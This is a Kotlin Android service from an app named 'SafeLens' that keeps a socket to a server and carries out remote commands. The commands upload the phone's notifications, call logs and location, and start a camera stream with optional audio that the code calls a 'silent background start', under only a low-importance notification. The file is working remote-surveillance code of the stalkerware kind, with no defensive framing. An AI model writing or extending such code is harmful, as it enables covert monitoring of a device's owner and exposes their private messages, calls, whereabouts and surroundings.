package com.safelens.app.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.pm.ServiceInfo
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import com.safelens.app.data.CameraStreamDeviceStateUpdateDto
import com.safelens.app.data.DeviceCommandDto
import com.safelens.app.data.DeviceRepository
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.serialization.json.Json
import org.json.JSONObject
import kotlin.coroutines.resume

class DeviceConnectionService : Service() {
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val json = Json { ignoreUnknownKeys = true }
    private var heartbeatJob: Job? = null
    private var syncJob: Job? = null
    private var runtimeStarted = false
    private var realtimeSocket: Socket? = null
    private var batteryReceiverRegistered = false
    private lateinit var repository: DeviceRepository
    private val commandProcessingMutex = Mutex()
    private val fusedLocationClient by lazy {
        LocationServices.getFusedLocationProviderClient(this)
    }
    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            serviceScope.launch {
                repository.queueCurrentBatterySnapshot()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        repository = DeviceRepository.create(application)
        createNotificationChannel()
        startForegroundWithCurrentType()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (repository.getStoredSession() == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        if (!runtimeStarted) {
            runtimeStarted = true
            startBatteryMonitor()
            startHeartbeatLoop()
            startSyncLoop()
            serviceScope.launch {
                repository.queueDetailedDeviceInfoSnapshot()
                repository.queueCurrentBatterySnapshot()
                connectRealtimeSocket()
                processPendingCommands()
                repository.uploadPendingTelemetry()
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        runtimeStarted = false
        stopBatteryMonitor()
        disconnectRealtimeSocket()
        serviceScope.cancel()
        super.onDestroy()
    }

    private fun buildNotification(): Notification {
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("SafeLens sync runtime")
            .setContentText("Telemetry and trusted device commands stay active.")
            .setSmallIcon(android.R.drawable.presence_online)
            .setOngoing(true)
            .build()
    }

    private fun startForegroundWithCurrentType() {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            startForeground(NOTIFICATION_ID, notification, serviceType)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startHeartbeatLoop() {
        if (heartbeatJob?.isActive == true) {
            return
        }

        heartbeatJob = serviceScope.launch {
            while (isActive) {
                val storedSession = repository.heartbeatStoredSession()
                if (storedSession == null) {
                    stopSelf()
                    return@launch
                }
                delay(10_000)
            }
        }
    }

    private fun startSyncLoop() {
        if (syncJob?.isActive == true) {
            return
        }

        syncJob = serviceScope.launch {
            var idleCycles = 0

            while (isActive) {
                processPendingCommands()

                val uploaded = repository.uploadPendingTelemetry()
                val uploadedNotifications = repository.uploadPendingNotifications()
                val uploadedCallLogs = repository.uploadPendingCallLogs()

                if (realtimeSocket?.connected() != true) {
                    delay(10_000L)
                    continue
                }

                idleCycles =
                    if (uploaded || uploadedNotifications || uploadedCallLogs) {
                        0
                    } else {
                        (idleCycles + 1).coerceAtMost(4)
                    }
                val delayMs = (30_000L * (1 shl idleCycles)).coerceAtMost(300_000L)
                delay(delayMs)
            }
        }
    }

    private fun startBatteryMonitor() {
        if (batteryReceiverRegistered) {
            return
        }

        registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        batteryReceiverRegistered = true
    }

    private fun stopBatteryMonitor() {
        if (!batteryReceiverRegistered) {
            return
        }

        unregisterReceiver(batteryReceiver)
        batteryReceiverRegistered = false
    }

    private fun connectRealtimeSocket() {
        if (realtimeSocket?.connected() == true) {
            return
        }

        val storedSession = repository.getStoredSession() ?: return
        val socket = IO.socket(repository.getApiBaseUrl(), IO.Options.builder().build())
        realtimeSocket = socket

        socket.on(Socket.EVENT_CONNECT) {
            socket.emit(
                "device.subscribe",
                JSONObject().put("deviceToken", storedSession.deviceToken)
            )
        }
        socket.on("device.subscribe.ok") {
            serviceScope.launch {
                processPendingCommands()
            }
        }
        socket.on("device.command") { args ->
            val rawValue = args.firstOrNull()?.toString() ?: return@on
            serviceScope.launch {
                runCatching {
                    json.decodeFromString(DeviceCommandDto.serializer(), rawValue)
                }.onSuccess { command ->
                    processCommand(command)
                }.onFailure { throwable ->
                    Log.e(TAG, "Unable to decode device command.", throwable)
                }
            }
        }
        socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
            Log.e(TAG, "Realtime socket connection error: ${args.firstOrNull()}")
        }

        socket.connect()
    }

    private fun disconnectRealtimeSocket() {
        realtimeSocket?.disconnect()
        realtimeSocket?.close()
        realtimeSocket = null
    }

    private suspend fun processPendingCommands() {
        repository.listPendingCommands().forEach { command ->
            processCommand(command)
        }
    }

    private suspend fun processCommand(command: DeviceCommandDto) {
        commandProcessingMutex.withLock {
            repository.acknowledgeCommand(command.id, "acknowledged")

            runCatching {
                when (command.type) {
                    "device.refresh_info" -> {
                        repository.queueDetailedDeviceInfoSnapshot()
                        repository.queueCurrentBatterySnapshot()
                        if (!repository.uploadPendingTelemetry(throwOnFailure = true)) {
                            error("No telemetry changes were queued for upload.")
                        }
                    }

                    "device.refresh_notifications" -> {
                        NotificationCaptureService.ensureListenerBound(this@DeviceConnectionService)
                        val capturedCount =
                            NotificationCaptureService.captureActiveNotificationsSnapshot(
                                this@DeviceConnectionService
                            )
                        val uploaded = repository.uploadPendingNotifications(throwOnFailure = true)
                        if (capturedCount == 0 && !uploaded) {
                            error("No notifications were available to sync from the device.")
                        }
                    }

                    "device.refresh_call_logs" -> {
                        val capturedCount = repository.refreshCallLogsSnapshot()
                        val uploaded = repository.uploadPendingCallLogs(throwOnFailure = true)
                        if (capturedCount == 0 && !uploaded) {
                            error(
                                if (repository.hasCallLogPermission()) {
                                    "No call logs were returned by Android. Check OEM privacy restrictions and recent call history."
                                } else {
                                    "Call log permission is not granted on the device."
                                }
                            )
                        }
                    }

                    "device.get_location" -> {
                        val locationResult = requestBestEffortLocation() ?: error("Location unavailable.")
                        repository.queueLocationSnapshot(
                            latitude = locationResult.location?.latitude,
                            longitude = locationResult.location?.longitude,
                            accuracyMeters = locationResult.location?.accuracy,
                            provider = locationResult.location?.provider ?: "fused",
                            isEnabled = locationResult.isEnabled,
                            statusLabel = locationResult.statusLabel
                        )
                        if (!repository.uploadPendingTelemetry(throwOnFailure = true)) {
                            error("Location snapshot was not uploaded.")
                        }
                    }

                    "device.start_camera_stream" -> {
                        val requestedFacing = command.payload.cameraFacing ?: "back"
                        val requestedAudio = command.payload.includeAudio ?: false
                        val requestedTransport = command.payload.preferredTransport ?: "webrtc"

                        if (!repository.hasCameraPermission()) {
                            throw CameraStartCommandFailure(
                                status = "failed",
                                errorCode = CAMERA_ERROR_CAMERA_PERMISSION_MISSING,
                                message = "Camera permission is not granted on the device."
                            )
                        }

                        val armResult = ensureCameraServiceArmed()
                        if (!armResult.ready) {
                            throw CameraStartCommandFailure(
                                status = armResult.status,
                                errorCode = armResult.errorCode ?: CAMERA_ERROR_SERVICE_NOT_ARMED,
                                message =
                                    armResult.message
                                        ?: "Camera service is not armed for silent background start. Open SafeLens on the phone once."
                            )
                        }

                        Log.i(
                            TAG,
                            "Processing camera start command ${command.id} sessionId=${command.payload.cameraSessionId ?: "n/a"}."
                        )
                        val requestedSessionId = command.payload.cameraSessionId
                        val startAccepted = CameraStreamService.startSession(
                            this@DeviceConnectionService,
                            cameraFacing = requestedFacing,
                            includeAudio = requestedAudio,
                            preferredTransport = requestedTransport,
                            cameraSessionId = requestedSessionId,
                            frameIntervalMs = command.payload.frameIntervalMs ?: 500
                        )
                        if (!startAccepted) {
                            val runtimeState = CameraStreamService.getRuntimeSnapshot()
                            val errorCode =
                                runtimeState.lastErrorCode ?: CAMERA_ERROR_SIGNALING_FAILED
                            throw CameraStartCommandFailure(
                                status = cameraStatusForErrorCode(errorCode),
                                errorCode = errorCode,
                                message =
                                    normalizeRemoteError(runtimeState.lastError)
                                        ?: "Camera stream request could not be dispatched to the armed service."
                            )
                        }

                        val readinessResult = waitForCameraSessionReady(requestedSessionId)
                        if (!readinessResult.ready) {
                            throw CameraStartCommandFailure(
                                status = readinessResult.status,
                                errorCode = readinessResult.errorCode ?: CAMERA_ERROR_SIGNALING_FAILED,
                                message =
                                    readinessResult.message
                                        ?: "Camera stream failed before signaling was ready."
                            )
                        }
                    }

                    "device.stop_camera_stream" -> {
                        CameraStreamService.stopSession(this@DeviceConnectionService)
                        repository.updateCameraStreamState(
                            CameraStreamDeviceStateUpdateDto(
                                status = "idle",
                                cameraSessionId = command.payload.cameraSessionId
                            )
                        )
                    }

                    "device.start_location_reporting" -> {
                        repository.setLocationReportingEnabled(true)
                        repository.setLocationIntervalMinutes(
                            command.payload.intervalMinutes ?: DEFAULT_LOCATION_INTERVAL_MINUTES
                        )
                    }

                    "device.stop_location_reporting" -> {
                        repository.setLocationReportingEnabled(false)
                    }
                }
            }.onSuccess {
                repository.acknowledgeCommand(command.id, "completed")
            }.onFailure { throwable ->
                if (command.type == "device.start_camera_stream") {
                    publishCameraFailureState(command, throwable)
                }
                repository.acknowledgeCommand(
                    command.id,
                    "failed",
                    normalizeRemoteError(throwable.message) ?: "Command execution failed."
                )
                Log.e(TAG, "Unable to process device command ${command.id}.", throwable)
            }
        }
    }

    private suspend fun publishCameraFailureState(
        command: DeviceCommandDto,
        throwable: Throwable
    ) {
        val errorCode =
            when (throwable) {
                is CameraStartCommandFailure -> throwable.errorCode
                is SecurityException -> CAMERA_ERROR_FGS_START_BLOCKED
                else -> CAMERA_ERROR_SIGNALING_FAILED
            }
        val status =
            when (throwable) {
                is CameraStartCommandFailure -> throwable.status
                is SecurityException -> "activation_blocked"
                else -> "failed"
            }
        val lastError =
            normalizeRemoteError(throwable.message)
                ?: "Camera stream command failed before startup completed."

        runCatching {
            repository.updateCameraStreamState(
                CameraStreamDeviceStateUpdateDto(
                    status = status,
                    cameraFacing = command.payload.cameraFacing ?: "back",
                    includeAudio = command.payload.includeAudio ?: false,
                    preferredTransport = command.payload.preferredTransport ?: "webrtc",
                    signalingReady = false,
                    cameraSessionId = command.payload.cameraSessionId,
                    lastErrorCode = errorCode,
                    lastError = lastError
                )
            )
        }.onFailure { error ->
            Log.e(
                TAG,
                "Unable to publish camera start failure state for command ${command.id}.",
                error
            )
        }
    }

    private suspend fun waitForCameraSessionReady(
        expectedSessionId: String?,
        timeoutMs: Long = CAMERA_SESSION_READY_TIMEOUT_MS
    ): CameraStartReadinessResult {
        val startedAt = SystemClock.elapsedRealtime()
        while (SystemClock.elapsedRealtime() - startedAt < timeoutMs) {
            val runtimeState = CameraStreamService.getRuntimeSnapshot()
            val failureCode = runtimeState.lastErrorCode
            val failureSessionMatches =
                failureCode != null &&
                    (expectedSessionId == null ||
                        runtimeState.failureSessionId == null ||
                        runtimeState.failureSessionId == expectedSessionId)
            if (failureSessionMatches) {
                return CameraStartReadinessResult(
                    ready = false,
                    status = cameraStatusForErrorCode(failureCode),
                    errorCode = failureCode ?: CAMERA_ERROR_SIGNALING_FAILED,
                    message =
                        normalizeRemoteError(runtimeState.lastError)
                            ?: "Camera stream failed before signaling was ready."
                )
            }

            if (!runtimeState.armed || !runtimeState.running) {
                return CameraStartReadinessResult(
                    ready = false,
                    status = "activation_blocked",
                    errorCode = CAMERA_ERROR_SERVICE_NOT_ARMED,
                    message =
                        "Camera service is not armed for silent start. Open SafeLens on the phone once."
                )
            }

            val signalingReadyMatches =
                runtimeState.signalingReadySessionId != null &&
                    (expectedSessionId == null ||
                        runtimeState.signalingReadySessionId == expectedSessionId)
            if (signalingReadyMatches) {
                return CameraStartReadinessResult(
                    ready = true,
                    status = "completed",
                    errorCode = null,
                    message = null
                )
            }
            delay(200L)
        }

        return CameraStartReadinessResult(
            ready = false,
            status = "failed",
            errorCode = CAMERA_ERROR_START_TIMEOUT,
            message = "Camera stream service did not become signaling-ready in time."
        )
    }

    private suspend fun ensureCameraServiceArmed(
        timeoutMs: Long = CAMERA_ARM_TIMEOUT_MS
    ): CameraServiceArmResult {
        val runtimeState = CameraStreamService.getRuntimeSnapshot()
        if (runtimeState.running && runtimeState.armed) {
            return CameraServiceArmResult(
                ready = true,
                status = "idle",
                errorCode = null,
                message = null
            )
        }

        val armResult = CameraStreamService.arm(this@DeviceConnectionService)
        if (!armResult.success) {
            return CameraServiceArmResult(
                ready = false,
                status = armResult.status,
                errorCode = armResult.errorCode,
                message =
                    normalizeRemoteError(armResult.message)
                        ?: "Camera service could not be armed from background runtime."
            )
        }

        val startedAt = SystemClock.elapsedRealtime()
        while (SystemClock.elapsedRealtime() - startedAt < timeoutMs) {
            val snapshot = CameraStreamService.getRuntimeSnapshot()
            if (snapshot.running && snapshot.armed) {
                return CameraServiceArmResult(
                    ready = true,
                    status = "idle",
                    errorCode = null,
                    message = null
                )
            }

            val failureCode = snapshot.lastErrorCode
            if (failureCode != null) {
                return CameraServiceArmResult(
                    ready = false,
                    status = cameraStatusForErrorCode(failureCode),
                    errorCode = failureCode,
                    message =
                        normalizeRemoteError(snapshot.lastError)
                            ?: "Camera service failed while arming in background."
                )
            }

            delay(200L)
        }

        return CameraServiceArmResult(
            ready = false,
            status = "activation_blocked",
            errorCode = CAMERA_ERROR_SERVICE_NOT_ARMED,
            message = "Camera service did not report an armed state in time."
        )
    }

    private fun cameraStatusForErrorCode(errorCode: String?): String {
        return if (errorCode == CAMERA_ERROR_SERVICE_NOT_ARMED || errorCode == CAMERA_ERROR_FGS_START_BLOCKED) {
            "activation_blocked"
        } else {
            "failed"
        }
    }

    private fun normalizeRemoteError(message: String?): String? {
        val trimmed = message?.trim().orEmpty()
        if (trimmed.isBlank()) {
            return null
        }

        val normalized =
            if (trimmed.length >= 2) {
                trimmed
            } else {
                "Command execution failed."
            }
        return normalized.take(MAX_REMOTE_ERROR_LENGTH)
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun isLocationServicesEnabled(): Boolean {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            locationManager?.isLocationEnabled == true
        } else {
            locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true ||
                locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true
        }
    }

    private suspend fun requestBestEffortLocation(): ResolvedLocation? {
        if (!hasLocationPermission()) {
            return null
        }

        val locationServicesEnabled = isLocationServicesEnabled()
        if (!locationServicesEnabled) {
            val lastKnownLocation = requestLastKnownLocation()
            return ResolvedLocation(
                location = lastKnownLocation,
                isEnabled = false,
                statusLabel = "disabled"
            )
        }

        val currentLocation = requestSingleLocation()
        if (currentLocation != null) {
            return ResolvedLocation(
                location = currentLocation,
                isEnabled = true,
                statusLabel = "live"
            )
        }

        val lastKnownLocation = requestLastKnownLocation()
        lastKnownLocation ?: return null
        return ResolvedLocation(
            location = lastKnownLocation,
            isEnabled = true,
            statusLabel = "last_known"
        )
    }

    private suspend fun requestSingleLocation() = suspendCancellableCoroutine<Location?> { continuation ->
        if (!hasLocationPermission()) {
            continuation.resume(null)
            return@suspendCancellableCoroutine
        }

        startForegroundWithCurrentType()
        val cancellationTokenSource = CancellationTokenSource()
        continuation.invokeOnCancellation {
            cancellationTokenSource.cancel()
        }

        fusedLocationClient.getCurrentLocation(
            Priority.PRIORITY_BALANCED_POWER_ACCURACY,
            cancellationTokenSource.token
        )
            .addOnSuccessListener { location ->
                if (continuation.isActive) {
                    continuation.resume(location)
                }
            }
            .addOnFailureListener { throwable ->
                Log.e(TAG, "Unable to fetch current location.", throwable)
                if (continuation.isActive) {
                    continuation.resume(null)
                }
            }
    }

    private suspend fun requestLastKnownLocation() = suspendCancellableCoroutine<Location?> { continuation ->
        if (!hasLocationPermission()) {
            continuation.resume(null)
            return@suspendCancellableCoroutine
        }

        fusedLocationClient.lastLocation
            .addOnSuccessListener { location ->
                if (continuation.isActive) {
                    continuation.resume(location)
                }
            }
            .addOnFailureListener { throwable ->
                Log.e(TAG, "Unable to fetch last known location.", throwable)
                if (continuation.isActive) {
                    continuation.resume(null)
                }
            }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return
        }

        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(
            CHANNEL_ID,
            "SafeLens connection",
            NotificationManager.IMPORTANCE_LOW
        )
        manager.createNotificationChannel(channel)
    }

    companion object {
        private const val CHANNEL_ID = "safelens-connection"
        private const val NOTIFICATION_ID = 41
        private const val TAG = "DeviceConnectionService"
        private const val DEFAULT_LOCATION_INTERVAL_MINUTES = 10
        private const val CAMERA_SESSION_READY_TIMEOUT_MS = 12_000L
        private const val CAMERA_ARM_TIMEOUT_MS = 5_000L
        private const val MAX_REMOTE_ERROR_LENGTH = 1024
        private const val CAMERA_ERROR_SERVICE_NOT_ARMED = "service_not_armed"
        private const val CAMERA_ERROR_FGS_START_BLOCKED = "fgs_start_blocked"
        private const val CAMERA_ERROR_CAMERA_PERMISSION_MISSING = "camera_permission_missing"
        private const val CAMERA_ERROR_SIGNALING_FAILED = "signaling_failed"
        private const val CAMERA_ERROR_START_TIMEOUT = "start_timeout"

        fun start(context: Context) {
            val intent = Intent(context, DeviceConnectionService::class.java)
            runCatching {
                ContextCompat.startForegroundService(context, intent)
            }.onFailure { throwable ->
                Log.e(TAG, "Unable to start device connection service.", throwable)
            }
        }

        fun stop(context: Context) {
            runCatching {
                context.stopService(Intent(context, DeviceConnectionService::class.java))
            }.onFailure { throwable ->
                Log.e(TAG, "Unable to stop device connection service.", throwable)
            }
        }
    }

    private data class ResolvedLocation(
        val location: Location?,
        val isEnabled: Boolean,
        val statusLabel: String
    )

    private data class CameraStartReadinessResult(
        val ready: Boolean,
        val status: String,
        val errorCode: String?,
        val message: String?
    )

    private data class CameraServiceArmResult(
        val ready: Boolean,
        val status: String,
        val errorCode: String?,
        val message: String?
    )

    private class CameraStartCommandFailure(
        val status: String,
        val errorCode: String,
        override val message: String
    ) : IllegalStateException(message)
}
